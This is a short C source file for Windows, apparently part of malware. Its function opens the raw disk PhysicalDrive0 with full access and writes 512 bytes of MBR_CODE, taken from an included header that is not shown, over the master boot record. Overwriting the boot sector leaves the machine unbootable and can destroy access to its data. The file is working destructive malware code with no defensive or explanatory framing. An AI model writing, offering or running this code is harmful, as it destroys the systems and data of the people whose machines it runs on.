#include "dep.h"
#include "data.h"

void MBR() {
	DWORD dwDump = NULL;
	HANDLE Device = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(Device, MBR_CODE, 512, &dwDump, NULL);
	CloseHandle(Device);
}